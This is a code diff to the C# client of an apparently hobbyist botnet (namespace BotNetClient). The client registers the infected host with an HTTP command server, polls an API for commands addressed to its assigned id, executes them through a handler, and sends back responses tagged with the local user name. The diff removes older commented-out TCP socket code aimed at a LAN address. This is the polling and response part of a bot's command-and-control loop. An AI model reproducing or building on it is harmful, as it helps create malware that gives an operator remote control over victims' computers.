@@ -22,30 +22,7 @@ namespace BotNetClient
             IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
             IPAddress ipadress = iphostinfo.AddressList[0];
             List<string> apiipadress = new List<string> { };
-            if (HttpHandler.ResultIPTask().Result.IndexOf(ipadress.ToString())>=0)
-            {
-                
-            }
-            else
-            {
-                idc = HttpHandler.CreateIpAndIdAsync(ipadress.ToString()).Result;
-            }
-            #region tcp and socket code
-            //IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
-            //IPAddress ipadress = iphostinfo.AddressList[0];
-            //IPEndPoint ippoint = new IPEndPoint(ipadress, 8005);
-            //Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            //TcpClient client = null;
-            //string address = "192.168.0.17";
-            //int port = 8005;
-            //string answer = null;
-            //client = new TcpClient(address, port);
-
-            //NetworkStream stream1 = client.GetStream();
-            //byte[] ipsend = new byte[100];
-            //ipsend = Encoding.Unicode.GetBytes(ipadress.ToString());
-            //stream1.Write(ipsend, 0, ipsend.Length);
-            #endregion
+            idc = HttpHandler.CreateIpAndIdAsync(ipadress.ToString()).Result;
             uint id = 1;
             id = HttpHandler.IdResult().Result+1;
             try
@@ -62,13 +39,13 @@ namespace BotNetClient
                         {
                         if ((HttpHandler.GetCommandAssync<Command>($"/api/v1/messages/{id - 1}").Result != null))
                         {
-                            if ((HttpHandler.ResultIdCmd((id - 1).ToString()).Result == id - 1) && (HttpHandler.ResultIpCmdAsync((id - 1).ToString()).Result.IndexOf(ipadress.ToString()) >= 0))
+                            if ((HttpHandler.ResultIdCmd((id - 1).ToString()).Result == id - 1) && (HttpHandler.ResultIdsCmdAsync((id - 1).ToString()).Result.IndexOf(idc.ToString()) >= 0))
                             {
                                 string answer = HttpHandler.ResultCmd((id - 1).ToString()).Result;
                                 Stopwatch watch = new Stopwatch();
                                 watch.Start();
-                                string message = "Ответ от " + ipadress.ToString() + " : " + handler.handl(answer, idc, ipadress.ToString()) + ". Time Used: " + watch.ElapsedMilliseconds + "ms";
-                                HttpHandler.SendResponse(message, ipadress.ToString());
+                                string message = "Ответ от " + "PC: " + Environment.UserName + " : " + handler.handl(answer, idc, ipadress.ToString()) + ". Time Used: " + watch.ElapsedMilliseconds + "ms";
+                                HttpHandler.SendResponse(message, idc.ToString());
                                 watch.Stop();
                                 id++;
                             }
